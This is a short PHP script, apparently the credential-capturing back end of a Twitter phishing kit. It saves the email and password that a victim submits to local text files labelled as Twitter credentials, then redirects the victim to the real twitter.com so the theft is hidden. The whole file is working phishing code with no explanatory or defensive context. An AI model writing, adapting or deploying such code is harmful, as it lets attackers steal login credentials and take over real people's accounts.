<?php

file_put_contents("usernames.txt", "Twitter Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Twitter Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');
?>
